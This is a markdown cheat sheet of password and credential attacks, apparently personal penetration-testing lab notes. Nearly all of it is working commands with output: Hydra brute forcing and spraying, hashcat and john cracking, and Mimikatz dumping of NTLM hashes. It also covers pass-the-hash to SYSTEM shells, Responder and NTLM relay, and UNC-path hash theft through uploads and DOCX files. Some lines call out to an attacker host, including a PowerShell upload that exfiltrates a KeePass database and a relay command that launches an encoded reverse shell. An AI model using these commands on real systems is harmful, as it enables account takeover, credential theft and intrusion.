# Password Attacks

## Hydra Brute Force Protocol Logins

* Hydra attacks a lot of protocols VNC, SSH, RDP, FTP
* -l login name Linux root or Windows Administrator
* -L Login list
* -p password
* -P Password list
* -s port number
* -t 1

```bash
# password guessing
hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.1.2
# password spraying
hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.1.2
hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" ftp://192.168.1.2

```

## Hydra Brute-Force Web Logins

* Brute Force with HTTP POST form
* 3 params i.e. `/page.html:u=user&p=pass:Login failed.`
* Brute Force with HTTP GET basic and digest auth
* 3 params  i.e. `/page.html:A=basic:F=401`

```bash
# http-post-form
#
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.180.201 http-post-form "/index.php:fm_usr=^USER^&fm_pwd=^PASS^:Login failed. Invalid"

hydra -l admin -V -P /usr/share/wordlists/rockyou.txt "http-get://10.9.9.12:8080/manager/html:A=BASIC:F=401"

```

## Password Cracking with Hashcat or John (the Ripper)

* Set hash type
* -m 0 e.g. hash type MD5
* Benchmark which tool perform better
* -b benchmark
* Follow known password policy rules `/usr/share/hashcat/rules`
* More `https://hashcat.net/wiki/doku.php?id=rule_based_attack#implemented_compatible_functions`


```bash
hashcat -b
```

Manipulate dictionary files with rule sets

* seperate to rules with `space` to apply for each password

```bash
# delete lines no starting with 1
sed -i '/^1/d' /tmp/pass.txt
# capitalize with c
echo c > demo.rule
# prepend with ^
echo \^2 > demo.rule
# append with $
echo \$! > demo.rule
```

```bash
# test the rule
echo "c \$!" > demo.rule
hashcat -r demo.rule --stdout pass.txt
```

```bash
ls /usr/share/hashcat/rules
hashcat -m 0 crackme.txt -r demo.rule --force /usr/share/wordlists/rockyou.txt
hashcat -m 0 "8743b52063cd84097a65d1633f5c74f5" -r demo.rule /usr/share/wordlists/rockyou.txt
```

## Password Cracking 101

Follow a practical rule set

* Extract and Identify hashes e.g. `hash-identifier` or `hashid` or `https://hashes.com/en/tools/hash_identifier` 
* Format hashes
* Calculate the cracking time
* Prepare wordlist based on rule sets
* Attack the hash

## Keepass Cracking

```powershell
# search for keepass db files with powershell
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
# exfiltrate with HTTP upload 
(New-Object System.Net.WebClient).UploadFile("http://192.168.45.234/upload.php?name=Database.kdbx", "C:\Users\user\Desktop\Database.kdbx")
```

```bash
# transform 2 john format
keepass2john Database.kdbx > keepass.john
# remove Database: "username"
cat keepass.john | cut -d: -f2 > keepass.hashcat 
# retrieve hash mode 13400 and crack the password
hashcat --help | grep -i "KeePass"
hashcat -m 13400 keepass.hashcat /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
```

## SSH Key Cracking

```bash
ssh2john id_rsa > ssh.john

# hashcat does NOT support the hash
hashcat --help | grep -i "ssh"

# prepare john.conf
cat ssh.rule
[List.Rules:sshRules]
c $1 $3 $7 $!
c $1 $3 $7 $#
sudo sh -c 'cat ssh.rule >> /etc/john/john.conf'
# run john
john --wordlist=ssh.passwords --rules=sshRules ssh.john
# connect ssh
chmod 600 id_rsa
ssh -i id_rsa -p user@192.168.180.201
```

## NTLM Cracking

* **Limitation**: Require privileges `SeDebugPrivilege` or `Administrator`
* **Limitation**: Require privileges `SeImpersonatePrivilege13` for token elevation
* Use mimikatz to extract with NTLM hashes
* Module `sekurlsa` extracts the password hash from LSASS 
* SAM Folder `C:\Windows\system32\config\sam`

```powershell
# enumerate local users
Get-LocalUser

Mimikatz.exe
# Enabling SeDebugPrivilege, elevating to SYSTEM user privileges and extracting NTLM hashes
privilege::debug
  20 'OK'
token::elevate
  -> Impersonated !
lsadump::sam
  NTML hash:
# sekurlsa::logonpasswords
```

```bash
hashcat --help | grep -i "ntlm"
  1000 | NTLM ...

hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force  
```

## Passing NTLM

* pass-the-hash (PtH) technique
 ** run pwsh as admin
 ** get hash with mimikatz
* authenticate with administrator to a local or remote target with **username and NTLM hash**
* SMB tools `smbclient` or `CrackMapExec`
* RCE tools `impacket-psexec` or `impacket-wmiexec`


```powershell
# run pwsh as admin
powershell Start-Process -Verb Runas powershell
# get admin hash using mimikatz
User : Administrator
  Hash NTLM: 7a38310ea6f0027ee955abed1762964b
```

Use SMB tool smbclient with pass-the-hash

```bash
smbclient \\\\192.168.1.2\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b

smb >
```

Use RCE tool impacket-psexec with pass-the-hash

psexec searches for a writable share e.g. SMB and uploads an executable file to it. Then it registers the executable as a Windows service and starts it. The result often is the desired remote code execution.

```bash
# The format is LM:NTLM. Let's use the NTLM hash only! Hence 32 0s for LM.
impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@10.1.2.3

[*] Found writable share ADMIN$
[*] Uploading file fxklemwe.exe
...
C:\Windows\system32> whoami
NT authority\system
```

```bash
impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@10.1.2.3
...
C:\>whoami
files02\administrator
```

## Cracking Net-NTLMv2

* Abuse the Net-NTLMv2 network authentication protocol
* Use `Responder` tool to setup a honeypot and print captured hashes
* Supported protocols are:
  * Servers (including HTTP and FTP),
  * Link-Local Multicast Name Resolution (LLMNR), 
  * NetBIOS Name Service (NBT-NS), and Multicast DNS (MDNS),
  * poisoning capabilities for ARP and DNS

Run responder as root and connect with the target machine to crack the NTLMv2 hash

```bash
ip a
...
tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 500
    link/none 
    inet 192.168.45.171

sudo responder -I tun0
...
SMB server                 [ON]
[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 192.168.167.211
[SMB] NTLMv2-SSP Username : FILES01\paul
[SMB] NTLMv2-SSP Hash     : paul::FILES01:edecc49d3860a163:FAE9ADF57AFF14707F5ADCF9A01F7378:0101000000000000006471165D1BDB0152F3CB46EB1EC1D20000000002000800590034003500440001001E00570049004E002D0052004500450043004C004E004400500041004C00340004003400570049004E002D0052004500450043004C004E004400500041004C0034002E0059003400350044002E004C004F00430041004C000300140059003400350044002E004C004F00430041004C000500140059003400350044002E004C004F00430041004C0007000800006471165D1BDB0106000400020000000800300030000000000000000000000000200000104E03C87D48BBB6D80BF2579BC979DA56B1D0BDBF6575FD55E2565FF6CACFD00A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003100370031000000000000000000
```

```powershell
# Trigger NTMLv2 using SMB server
C:\Windows\system32>dir \\192.168.45.171\test
```

```bash
cat << EOF > paul.hash      
paul::FILES01:edecc49d3860a163:FAE9ADF57AFF14707F5ADCF9A01F7378:0101000000000000006471165D1BDB0152F3CB46EB1EC1D20000000002000800590034003500440001001E00570049004E002D0052004500450043004C004E004400500041004C00340004003400570049004E002D0052004500450043004C004E004400500041004C0034002E0059003400350044002E004C004F00430041004C000300140059003400350044002E004C004F00430041004C000500140059003400350044002E004C004F00430041004C0007000800006471165D1BDB0106000400020000000800300030000000000000000000000000200000104E03C87D48BBB6D80BF2579BC979DA56B1D0BDBF6575FD55E2565FF6CACFD00A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003100370031000000000000000000
EOF

hashcat --help | grep -i "ntlmv2"
   5600 | NetNTLMv2

hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

## Abusing Net-NTLMv2 using Web file upload or XXS vuln

* Limitation:**Windows only**
* Find a file upload on Webserver
* Manipulate the **filename** of the HTTP request
* Replace the **filename** with **UNC path** of your waiting responder or Inveigh

Sources:

* `https://0xdf.gitlab.io/2019/01/13/getting-net-ntlm-hases-from-windows.html`
* `https://www.ivoidwarranties.tech/posts/pentesting-tuts/responder/cheatsheet/`
  
```bash
sudo responder -I tun0 -v 

SMB] NTLMv2-SSP Client   : 192.168.167.210
[SMB] NTLMv2-SSP Username : MARKETINGWK01\sam
[SMB] NTLMv2-SSP Hash     : sam::MARKETINGWK01:149c73e3ffa2f4ff:39F258CD1D70FAF4D36BD3327C948C09:Truncated
```

```plain
# intercept burp request and trigger NTLMv2 Authication using UNC path 
# windows requires \\\\ 
...
POST /upload HTTP/1.1
Content-Disposition: form-data; name="myFile"; filename="\\\\192.168.45.171\\test"
```

Explaination:
We discover a file upload form in a web application on a Windows server, we can try to enter a non-existing file with a UNC path like \\192.168.119.2\share\nonexistent.txt. If the web application supports uploads via SMB, the Windows server will authenticate to our SMB server.

## Abusing Net-NTLMv2 using a DOCX Format

* Limitation:**Windows only**
* Add an image to docx Wordfile
* Manipulate the `document.xml.rels`
* Replace the image Target with **UNC path** of your waiting responder or Inveigh
* Cature the NTLMv2 hash

Sources:

* `https://0xdf.gitlab.io/2019/01/13/getting-net-ntlm-hases-from-windows.html`
* `https://infinitelogins.com/2020/11/16/capturing-relaying-net-ntlm-hashes-without-kali-linux-using-inveigh/`

```powershell
PS> Invoke-Inveigh -NBNS N -LLMNR N -ConsoleOutput Y -IP 192.168.0.2
```

## Abusing Net-NTLMv2 Relay Attack

This tool `impacket-ntlmrelayx` does the relay attack by setting up an SMB server and relaying the authentication part of an incoming SMB connection to a target of our choice.

* `impacket-ntlmrelayx`
* -t TARGET IP
* -c execute a powershell reverse shell one-liner with powercat.ps1
* -smb2support enable SMBv2
* --no-http-server disable HTTP
* Source: `https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py`

```bash
# Relay NTLMv2 hash to target and run powercat.ps1 reverse shell
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc JABjAGwAaQBlAG4AdA..."
```

```bash
# Listen for Reverse Shell 
nc -lvp 4444
```

```powershell
# Trigger NTLMv2 authentication
dir \\ATTACKER-IP\test
```